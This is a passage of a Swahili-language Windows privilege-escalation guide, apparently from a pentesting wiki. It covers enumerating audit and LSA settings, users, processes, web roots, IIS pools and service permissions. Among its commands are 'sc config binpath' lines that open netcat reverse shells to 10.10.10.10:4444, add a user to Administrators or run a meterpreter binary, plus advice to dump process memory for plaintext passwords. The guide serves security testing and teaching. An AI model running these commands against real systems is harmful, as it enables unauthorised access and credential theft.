Ili kutumia udhaifu huu, unaweza kutumia: _exploit/windows/local/always_install_elevated_

## Antivirus na Vigunduzi

### Mipangilio ya Ukaguzi

Mipangilio hii huamua kinachokuwa **kinarekodiwa**, kwa hiyo unapaswa kuizingatia.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding, inafaa kujua kumbukumbu zinatumwa wapi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** imeundwa kwa ajili ya **usimamizi wa nywila za Administrator za ndani**, na kuhakikisha kuwa kila nywila ni **ya kipekee, inayozalishwa bila mpangilio, na inayosasishwa mara kwa mara** kwenye kompyuta zilizojiunga na domain. Nywila hizi huhifadhiwa kwa usalama ndani ya Active Directory na zinaweza kufikiwa tu na watumiaji waliopewa ruhusa za kutosha kupitia ACLs, na kuwawezesha kuona nywila za admin za ndani ikiwa wameidhinishwa.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ikiwa imewashwa, **nywila za maandishi wazi huhifadhiwa kwenye LSASS** (Local Security Authority Subsystem Service).\
[**Maelezo zaidi kuhusu WDigest kwenye ukurasa huu**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### Ulinzi wa LSA

Kuanzia **Windows 8.1**, Microsoft ilianzisha ulinzi ulioboreshwa wa Local Security Authority (LSA) ili **kuzuia** michakato isiyoaminika **kusoma kumbukumbu yake** au kuingiza msimbo, na hivyo kuimarisha usalama wa mfumo.\
[**Maelezo zaidi kuhusu Ulinzi wa LSA hapa**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** ilianzishwa katika **Windows 10**. Madhumuni yake ni kulinda credentials zilizohifadhiwa kwenye kifaa dhidi ya vitisho kama vile mashambulizi ya pass-the-hash. [**Maelezo zaidi kuhusu Credential Guard yanapatikana hapa.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Vitambulisho Vilivyohifadhiwa kwenye Akiba

**Vitambulisho vya kikoa** huthibitishwa na **Local Security Authority** (LSA) na kutumiwa na vipengele vya mfumo wa uendeshaji. Data ya kuingia ya mtumiaji inapothibitishwa na kifurushi cha usalama kilichosajiliwa, kwa kawaida vitambulisho vya kikoa vya mtumiaji huanzishwa.\
[**Maelezo zaidi kuhusu Vitambulisho Vilivyohifadhiwa kwenye Akiba hapa**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Watumiaji na Vikundi

### Orodhesha Watumiaji na Vikundi

Unapaswa kuangalia ikiwa kuna vikundi vyovyote ulivyomo vyenye ruhusa muhimu.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Vikundi vyenye privilege

Ikiwa wewe ni mwanachama wa **kikundi chenye privilege, unaweza kupandisha privileges**. Jifunze kuhusu vikundi vyenye privilege na jinsi ya kuvitumia vibaya ili kupandisha privileges hapa:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Udanganyifu wa token

**Jifunze zaidi** kuhusu maana ya **token** kwenye ukurasa huu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Angalia ukurasa ufuatao ili **ujifunze kuhusu token za kuvutia** na jinsi ya kuzitumia vibaya:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Watumiaji walioingia / Sessions

```bash
qwinsta
klist sessions
```

### Folda za nyumbani

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Sera ya Nenosiri

```bash
net accounts
```

### Pata maudhui ya ubao wa kunakili

```bash
powershell -command "Get-Clipboard"
```

## Michakato Inayoendeshwa

### Ruhusa za Faili na Folda

Kwanza kabisa, unapoorodhesha michakato, **angalia kama kuna nywila ndani ya mstari wa amri wa mchakato**.\
Angalia kama unaweza **kubadilisha binary yoyote inayoendeshwa** au kama una ruhusa za kuandika kwenye folda ya binary ili kutumia mashambulizi yanayowezekana ya [**DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Daima angalia kama [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) zinaendesha; unaweza kuzitumia vibaya ili kuongeza ruhusa.

Listener ya debugger inaweza kuwepo kwa muda mfupi, kwa hivyo kutokuonekana kwake kwenye snapshot moja ya ports hakuthibitishi kwamba haikuwahi kufichuliwa. Linganisha listener yoyote iliyoonekana na PID yake, mmiliki wa process, na uwezo wa mtumiaji mwenye ruhusa za chini kuifikia; jina la programu au debug flag pekee havithibitishi utekelezaji wa msimbo kati ya watumiaji tofauti. Fanya enumeration ya kawaida bila kutuma debugger commands.

**Kuangalia ruhusa za binaries za michakato**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Kukagua ruhusa za folda za binary za michakato (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Saraka za dynamic preprocessor za Snort

Snort 2 inaweza kupakia maktaba zilizoshirikiwa kutoka kwenye `dynamicpreprocessor directory` iliyobainishwa kwenye usanidi uliochaguliwa kwa `snort.exe -c <config>`. Kwa scheduled task au service inayoendesha Snort chini ya akaunti tofauti, kagua usanidi huo mahususi na ACL ya saraka ya moduli iliyobainishwa. Ikiwa token yako inaweza kuunda faili humo, njia hiyo inafaa kukaguliwa kama uwezekano wa code execution task au service hiyo itakapopakia moduli tena. Thibitisha effective privileges za akaunti ya run-as, usanidi unaotumika, ulinganifu wa moduli, na vizuizi vyovyote vya deny au share; saraka inayoweza kuandikiwa pekee haithibitishi escalation. [Nyaraka za dynamic-preprocessor za Snort](https://www.snort.org/documents/dpx-readme) zinaeleza upakiaji wa moduli wakati wa runtime.

### Huduma ya wavuti yenye upendeleo wa juu na document root inayoweza kuandikiwa

Kwenye usakinishaji wa Apache wa Windows, linganisha njia ya executable ya service na akaunti ya run-as na `DocumentRoot` katika `httpd.conf` yake inayotumika. Kwa mpangilio wa kawaida wa XAMPP, kagua `C:\xampp\apache\conf\httpd.conf` na ACL ya document root iliyosanidiwa, ambayo mara nyingi ni `C:\xampp\htdocs`. Ikiwa mtumiaji mwenye upendeleo mdogo anaweza kuunda faili kwenye root hiyo huku Apache ikiendeshwa kama `LocalSystem`, server-side code execution inaweza kuvuka mpaka wa upendeleo wa host. Thibitisha kuwa service inaendeshwa, kuwa njia hiyo mahususi inatolewa, na kuwa handler ya server-side inachakata aina ya faili; root inayoweza kuandikiwa peke yake inathibitisha uundaji wa faili tu. Kagua ACL bila kuandika faili ya majaribio:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Kwa usakinishaji wa kawaida wa WAMP, huduma inaweza kuelekeza kwenye `C:\wamp64\bin\apache\apache*\bin\httpd.exe` yenye toleo maalum (au `C:\wamp\...` kwa muundo wa biti 32), huku usanidi ukiwa karibu nayo chini ya `conf\httpd.conf` na mzizi chaguomsingi ukiwa `C:\wamp64\www` au `C:\wamp\www`. Kagua pamoja picha halisi ya huduma, utambulisho inaoendeshewa, `DocumentRoot` inayotumika (ikiwemo upanuzi wa `${INSTALL_DIR}` na mabadiliko ya virtual host), na ACL ya mzizi. Saraka ya WAMP inayoweza kuandikwa haithibitishi kwamba Apache inaendeshwa kama `SYSTEM` au itatekeleza faili iliyowasilishwa. [Apache inaeleza jinsi huduma ya Windows inavyochagua usanidi wake](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Mzizi wa IIS unaoweza kuandikwa na utambulisho wa pool ya programu kwenye mtandao

Kwa IIS, linganisha saraka halisi inayoweza kuandikwa na **site/application inayotumika** katika `applicationHost.config`, kisha tambua pool iliyosanidiwa na handler ya upande wa seva. Msimbo uliowekwa kwenye saraka inayohudumiwa huendeshwa kama pool tu ikiwa IIS inachakata aina hiyo ya faili na njia inafikika. Kagua ruhusa za sasa za mtumiaji za kuunda faili, hali ya uendeshaji ya site, handler na mabadiliko ya kila njia kabla ya kuhitimisha kuwa saraka inayoweza kuandikwa inamaanisha utekelezaji wa msimbo.

Uundaji wa msimbo wa ASP.NET wakati wa utekelezaji huleta njia tofauti ya kukagua: faili zinazozalishwa chini ya saraka ya uundaji wa programu. Chaguomsingi ni saraka ya `Temporary ASP.NET Files` chini ya usakinishaji husika wa .NET Framework, lakini `<compilation tempDirectory>` ya programu inaweza kuibadilisha. [Microsoft inaeleza mahali ilipo na saraka ndogo za kila programu](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) na [inapendekeza kutenganisha saraka za uundaji wakati pool za programu haziaminiani](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Ikiwa tokeni yenye ruhusa ndogo inaweza kubadilisha chanzo kilichozalishwa kwenye akiba ya **programu mahususi**, bainisha kama programu hiyo itakikusanya upya chini ya [utambulisho wa mchakato wa worker](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) wenye ruhusa za juu zaidi. ACL ya faili au saraka peke yake haithibitishi utekelezaji wa msimbo: linganisha akiba na programu inayotumika, tokeni na ACL zinazotumika, mipangilio ya uundaji, utambulisho wa mchakato, na muda wa uundaji upya wowote. Kagua metadata kwa kusoma pekee; usichochee uundaji wa msimbo wala kubadilisha faili za akiba wakati wa uchunguzi.

Pool ya IIS iliyosanidiwa kama `ApplicationPoolIdentity` au `NetworkService` kwa kawaida hujithibitisha kwa rasilimali za kikoa kwa kutumia **akaunti ya kompyuta ya seva**, ingawa tokeni yake ya ndani inaweza kuwa na ruhusa ndogo. `LocalSystem` tayari ina ruhusa za juu sana kwenye mashine ya ndani, na pia hutumia akaunti ya kompyuta kwenye mtandao; kwa kawaida `LocalService` hutumia taarifa za mtandao zisizotambulisha mtumiaji. Pool ya `SpecificUser` hutumia akaunti yake iliyosanidiwa. [Microsoft inaeleza aina hizi za utambulisho](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) na [utambulisho wa pool ya programu kwenye mtandao](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Mipangilio ya utambulisho isiyobainishwa inaweza kurithi chaguomsingi za pool, ambazo hutofautiana kati ya vizazi vya IIS; kwa hiyo, bainisha usanidi unaotumika badala ya kukisia kutokana na jina la pool. Ikiwa utekelezaji wa msimbo unafikia pool yenye utambulisho wa akaunti ya kompyuta kwenye mtandao, tathmini ruhusa za saraka za **kompyuta hiyo mahususi**. [DCSync](../active-directory-methodology/dcsync.md) inahitaji ruhusa za replication kwenye muktadha wa majina ya kikoa; tiketi ya akaunti ya mashine au jukumu la seva pekee havithibitishi ruhusa hizo. Uchunguzi usioingilia mfumo unapaswa kukagua usanidi na ACL bila kupakia faili, kufanya uthibitishaji wa mtandao, au kuomba tiketi.

Kwa handler ya ASP.NET inayosomeka na inayoanzisha mchakato msaidizi, fuatilia thamani yoyote inayotokana na ombi kupitia uthibitishaji, usimbuaji fiche, uthibitishaji wa uhalali, na uundaji wa amri. Handler inayounganisha tokeni iliyofumbuliwa kwenye `ProcessStartInfo("cmd", "/c ...")` inaweza kuruhusu herufi maalum za shell kubadilisha amri; [Microsoft inaeleza herufi maalum za `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Thibitisha kwamba mpigaji asiyeaminika anaweza kuathiri thamani iliyofumbuliwa na kufikia handler, kisha bainisha utambulisho unaotumika wa pool ya programu au ule wa kuiga mtumiaji, pamoja na utambulisho wa mchakato mtoto. Mstari wa msimbo unaosomeka, kisikilizaji cha localhost, au udhaifu wa muundo wa tokeni pekee havithibitishi utekelezaji wa amri wenye ruhusa za juu. Kagua msimbo wa chanzo na usanidi wa pool bila kutuma maombi ya kughushi au kuendesha mchakato msaidizi wakati wa uchunguzi usioingilia mfumo.

Kwa huduma ya PHP kwenye Windows, njia inayodhibitiwa na ombi na kupitishwa kwa [`include` au `require`](https://www.php.net/manual/en/function.include.php) inaweza kutekeleza faili ya PHP inayoweza kuandikwa na mtumiaji mwenye ruhusa ndogo chini ya utambulisho wa worker. Thibitisha kwamba ombi linaweza kufikia kauli hiyo, njia iliyotatuliwa inaelekeza kwenye faili ambayo mtumiaji mwenye ruhusa ndogo anaweza kurekebisha na worker anaweza kusoma, vizuizi husika vya njia za PHP vinaruhusu include, na worker inaendeshwa kwa ruhusa za juu zaidi. Kisikilizaji cha loopback au faili inayoweza kuandikwa pekee havithibitishi mnyororo huu; kagua msimbo wa chanzo, utambulisho wa huduma na ACL za faili bila kuita endpoint wakati wa uchunguzi usioingilia mfumo.

### Uchimbaji wa nywila kutoka kwenye kumbukumbu

Unaweza kuunda dump ya kumbukumbu ya mchakato unaoendeshwa kwa kutumia **procdump** kutoka sysinternals. Huduma kama FTP zina **taarifa za kuingia katika mfumo zilizo katika maandishi wazi kwenye kumbukumbu**; jaribu kutupa kumbukumbu na kusoma taarifa hizo.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Apps za GUI zisizo salama

**Programu zinazoendeshwa kama SYSTEM zinaweza kuruhusu mtumiaji kufungua CMD au kuvinjari saraka.**

Mfano: "Windows Help and Support" (Windows + F1), tafuta "command prompt", bofya "Click to open Command Prompt"

### Uingizaji wa faili za mradi zenye haki za juu

Programu inayofungua miradi kiotomatiki kutoka kwenye saraka ya kushushia faili inayoweza kuandikwa na mtumiaji wa chini huvuka mpaka wa uaminifu wa ingizo chini ya akaunti ya programu inayoingiza. Kagua **njia halisi inayoweza kuandikwa**, mchakato au kazi inayoifungua, utambulisho wake wa utekelezaji, na toleo la parser. [Tatizo la kihistoria la kufungua/kurejesha mradi wa Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) liliruhusu XML external entities katika metadata ya mradi; entity ya mtandao kwenye Windows inaweza kusababisha akaunti inayoingiza kuthibitishwa ikiwa [sera za SMB na NTLM zinazotoka](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) zinaruhusu hilo. Hili ni dokezo la uwezekano wa kufichuka kwa kitambulisho, si ufikiaji wa msimamizi wa papo hapo: jibu lazima liweze kutumiwa kupitia njia tofauti iliyoidhinishwa au yenye athari, na matoleo ya sasa yanapaswa kutathminiwa kulingana na hali halisi ya viraka vyake. Usifungue mradi uliotengenezwa kwa makusudi wakati wa uorodheshaji tulivu; kagua mtiririko wa uingizaji na ACL.

## Huduma

Haki ya [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) ya kitu cha Service Control Manager (SCM) ni tofauti na haki za huduma iliyopo. Ombi la ufikiaji la kusoma tu la [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) lililofanikiwa kwa haki hiyo ni dokezo la kukagua, si uthibitisho kwamba huduma mpya inaweza kuendeshwa. [`CreateService` hurejesha handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) yenye haki za ufikiaji wa huduma zilizoombwa wakati wa uundaji; kuifungua tena huduma baadaye hufanya ukaguzi tofauti wa ufikiaji na kunaweza kushindwa hata pale handle ya awali ingeweza kutumiwa. Thibitisha kando tokeni halisi ya ndani au ya mbali, haki zilizopewa handle, akaunti ya huduma, sera ya kuanzisha, na njia ya executable. Usitengeneze wala kuanzisha huduma wakati wa uorodheshaji tulivu.

Kwa njia ya kusakinisha huduma kwa mbali, linganisha haki hizo za SCM na share kwenye target ambayo **logon hiyo hiyo ya mtandao** inaweza kuiandikia, ACL yake ya msingi ya NTFS, na njia ya ndani ya executable ambayo akaunti ya huduma inaweza kuendesha. Akaunti isiyo ya msimamizi inaweza kuvuka mpaka huu ikiwa kuna haki pana zisizo za kawaida za SCM pamoja na njia ya kuweka faili; share ya msimamizi si sharti la lazima. Ufikiaji wa kuandika kwenye share pekee, au dokezo la kuunda huduma kupitia SCM pekee, havithibitishi kwamba huduma mpya inaweza kuanza chini ya utambulisho wa juu zaidi.

Huduma iliyopo inaweza kuita executable saidizi inapowashwa, inapozimwa, au wakati wa tukio jingine la mzunguko wake wa maisha, hata kama executable hiyo haipo kwenye `ImagePath` yake. Ikiwa jina la executable saidizi linatafutwa ndani ya saraka inayoweza kuandikwa na mtumiaji wa chini, na huduma inaendeshwa chini ya utambulisho wa juu zaidi, faili saidizi inayokosekana inaweza kuwa mgombea wa kubadilishwa kwa masharti. Thibitisha **msimbo halisi wa huduma au mwito wa executable saidizi ulioandikwa kwenye nyaraka**, njia ya executable iliyotatuliwa na mpangilio wa utafutaji, ruhusa za kuunda saraka, utambulisho wa huduma, na kichocheo cha mzunguko wa maisha kinachopatikana. Saraka ya huduma inayoweza kuandikwa au faili inayokosekana pekee havithibitishi kwamba huduma itapakia faili hiyo; ukaguzi tulivu haupaswi kuanzisha wala kusimamisha huduma.

Kwa huduma iliyopo, [`SERVICE_START` huruhusu kutoa hoja kwa `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); ni tofauti na [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Kagua msimbo wa huduma au kiolesura chake kilichoandikwa kwenye nyaraka kabla ya kuchukulia ruhusa ya kuianzisha kuwa zaidi ya haki ya kuidhibiti. Ikiwa inatumia hoja iliyochaguliwa na mpigaji kama njia ya logi au ya kuhamisha data, thibitisha utambulisho wa huduma, mtiririko halisi wa hoja hadi uandishi, vikwazo vya njia, na ruhusa za **faili iliyoundwa**. Uandishi kwenye saraka iliyolindwa unaweza kuwa njia ya kupandisha haki tu ikiwa kuna mtumiaji au loader tofauti mwenye haki za juu anayeikubali faili hiyo; logi inayoweza kuandikwa au haki ya kuanzisha pekee haitoshi. Uorodheshaji tulivu haupaswi kuanzisha huduma wala kuunda faili ya majaribio.

Kwa wakala wa ufuatiliaji wa NSClient++, faili ya `nsclient.ini` inayoweza kusomwa ni **dokezo la kukagua usanidi**: inaweza kuwa na nywila za wavuti, huku `boot.ini` ikiweza kuelekeza usanidi mahali pengine. Kagua akaunti halisi ya huduma, kisikilizaji cha WEB na sera yake ya ufikiaji, na ikiwa jukumu lililothibitishwa linaweza kubadilisha mipangilio au scripts. Utekelezaji wenye haki za juu pia unahitaji `CheckExternalScripts` (au njia nyingine ya utekelezaji iliyowezeshwa), haki halisi ya kusajili au kurekebisha amri, na kichocheo kinachoitekeleza chini ya utambulisho wa huduma. Kisikilizaji kinachosikiliza loopback pekee bado kinaweza kufikiwa na mtumiaji wa ndani, lakini njia ya faili, nywila, au kisikilizaji pekee havithibitishi haki hizo. Kagua metadata na ruhusa bila kuonyesha siri au kuita web API wakati wa uorodheshaji tulivu. Tazama [mpangilio wa faili za NSClient++](https://nsclient.org/docs/concepts/file-layout/), [mwongozo wa usalama wa wavuti na scripts](https://nsclient.org/docs/setup/securing/), na [usanidi wa external-script](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Kwa huduma ambayo `ImagePath` yake ni `nssm.exe`, kagua akaunti halisi ya huduma inayotumika kuendesha programu na thamani yake ya `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM huhifadhi programu saidizi hapo](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), huku `AppDirectory` ikiwa saraka yake ya kufanya kazi iliyosanidiwa. Kagua executable saidizi na ACL za saraka zake zote za juu kabla ya kuchukulia ruhusa za wrapper kuwa ndizo zinazoamua mpaka mzima wa huduma. Endpoint ya ndani ya WCF au SOAP inayofichuliwa na programu saidizi hiyo ni dokezo tofauti la kukagua: thibitisha kwamba mtumiaji mwenye haki ndogo anaweza kuifikia listener, kwamba operesheni halisi inakubali ingizo lake, na kwamba programu saidizi ya huduma inatekeleza operesheni isiyo salama chini ya utambulisho wa juu zaidi. Akaunti ya huduma, URL ya endpoint, au njia inayoweza kuandikwa pekee havithibitishi kupandisha haki; epuka kuita operesheni za huduma wakati wa uorodheshaji tulivu.

Kwa operesheni maalum ya WCF, fuatilia maandishi yanayodhibitiwa na mpigaji yanapoingizwa kwenye runspace yoyote ya PowerShell. [`Pipeline.Commands.AddScript` huongeza maandishi ya script](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), na [`Pipeline.Invoke` huendesha pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` yenye vitambulisho vya Windows vya usafirishaji](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) humthibitisha mteja, lakini ruhusa ya kuita operesheni **hiyo mahususi** na utambulisho halisi wa runspace lazima vikaguliwe kando. Njia kutoka kwenye ingizo la mpigaji mwenye haki ndogo hadi `AddScript` chini ya utambulisho wa huduma wenye haki za juu ni mpaka wa utekelezaji wa msimbo; port inayosikiliza, mteja aliyethibitishwa, au method isiyotumika katika assembly isiyohusiana si uthibitisho peke yake. Kagua huduma iliyosakinishwa, contract, uidhinishaji, na mipangilio ya impersonation kwa njia tuli bila kuita endpoint wakati wa uorodheshaji.

Service Triggers huruhusu Windows kuanzisha huduma hali fulani zinapotokea (shughuli za named pipe/RPC endpoint, matukio ya ETW, upatikanaji wa IP, kifaa kuunganishwa, uonyeshaji upya wa GPO, n.k.). Hata bila haki za SERVICE_START, mara nyingi unaweza kuanzisha huduma zenye haki za juu kwa kuwasha triggers zake. Tazama mbinu za uorodheshaji na uanzishaji hapa:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Huduma ya Visual Studio ya kukusanya taarifa za uchunguzi

Usakinishaji wa Visual Studio wenye zana za C/C++ unaweza kujumuisha `VSStandardCollectorService150`, huduma ya uchunguzi iliyosanidiwa kuendeshwa kama `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) ilitumia junction na race ya object-manager-link kuelekeza upya uwekaji upya wa DACL ya huduma. Kupandisha haki kulikoonyeshwa pia kulihitaji njia inayoweza kutumika ya kurekebisha MSI ya Visual Studio Setup WMI Provider na target yake ya `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Kipengele hicho kilirekebishwa Januari 2024.

Kwa uchunguzi tulivu, kagua akaunti na njia ya binary ya huduma hiyo, angalia kama njia ya Setup WMI compiler ipo, na thibitisha hali ya viraka vya kipengele kilichosakinishwa. Ingizo la huduma, toleo la bidhaa ya Visual Studio, au faili ya compiler pekee havithibitishi kwamba host ina hatari hiyo. Ukaguzi hauhitaji kuanzisha huduma wala kuendesha repair.

Pata orodha ya huduma:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Ruhusa

Unaweza kutumia **sc** kupata taarifa kuhusu huduma.

```bash
sc qc <service_name>
```

Inapendekezwa kuwa na binary **accesschk** kutoka _Sysinternals_ ili kuangalia kiwango cha ruhusa kinachohitajika kwa kila service.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Inapendekezwa kuangalia kama "Authenticated Users" wanaweza kurekebisha huduma yoyote:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Unaweza kupakua accesschk.exe ya XP hapa](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Kuwasha huduma

Ukikumbana na hitilafu hii (kwa mfano, kwenye SSDPSRV):

_Hitilafu ya mfumo 1058 imetokea._\
_Huduma haiwezi kuwashwa kwa sababu imezimwa au hakuna vifaa vilivyowashwa vinavyohusishwa nayo._

Unaweza kuiwasha kwa kutumia

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Zingatia kwamba huduma ya upnphost inategemea SSDPSRV ili kufanya kazi (kwa XP SP1)**

**Suluhisho jingine la muda** la tatizo hili ni kuendesha:

```
sc.exe config usosvc start= auto
```

### **Badilisha njia ya binary ya service**

Katika hali ambapo kundi la "Authenticated users" lina **SERVICE_ALL_ACCESS** kwenye service, inawezekana kurekebisha binary inayotekelezwa na service. Ili kurekebisha na kutekeleza **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Anzisha upya huduma

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Ruhusa zinaweza kuongezwa kupitia ruhusa mbalimbali:

- **SERVICE_CHANGE_CONFIG**: Huruhusu kubadilisha usanidi wa binary ya service.
- **WRITE_DAC**: Huruhusu kubadilisha ruhusa, na hivyo kuwezesha kubadilisha usanidi wa service.
- **WRITE_OWNER**: Huruhusu kupata umiliki na kubadilisha ruhusa.
- **GENERIC_WRITE**: Hurithi uwezo wa kubadilisha usanidi wa service.
- **GENERIC_ALL**: Pia hurithi uwezo wa kubadilisha usanidi wa service.

Kwa kugundua na kutumia udhaifu huu, unaweza kutumia _exploit/windows/local/service_permissions_.

### Ruhusa dhaifu kwenye binary za service

Ikiwa service inaendeshwa kama **`LocalSystem`**, **`LocalService`**, **`NetworkService`**, au akaunti ya domain yenye ruhusa za juu, lakini **watumiaji wenye ruhusa za chini wanaweza kurekebisha EXE ya service au folda yake kuu**, mara nyingi service inaweza kutekwa kwa **kubadilisha binary na kuwasha tena service**.

**Angalia kama unaweza kurekebisha binary inayoendeshwa na service** au kama una **ruhusa za kuandika kwenye folda** ilipo binary hiyo ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Unaweza kupata kila binary inayoendeshwa na service kwa kutumia **wmic** (si katika system32) na kuangalia ruhusa zako kwa kutumia **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Unaweza pia kutumia **sc** na **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Tafuta ACL hatari zilizopewa **`Everyone`**, **`BUILTIN\Users`**, au **`Authenticated Users`**, hasa **`(F)`**, **`(M)`**, au **`(W)`** kwenye executable ya huduma au saraka iliyo nayo. Mchakato wa kawaida wa kutumia udhaifu huu ni:<sup>[[27]](#references)</sup>

1. Thibitisha akaunti ya huduma na njia ya executable kwa `sc qc <service_name>`.
2. Thibitisha kuwa binary inaweza kuandikwa kwa `icacls <path>`.
3. Badilisha binary ya huduma na payload au binary halali ya huduma hasidi.
4. Anzisha upya huduma kwa `sc stop <service_name> && sc start <service_name>` (au subiri mfumo uwashe upya / kichochezi cha huduma).

Ukaguzi wa kiotomatiki unaofaa:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

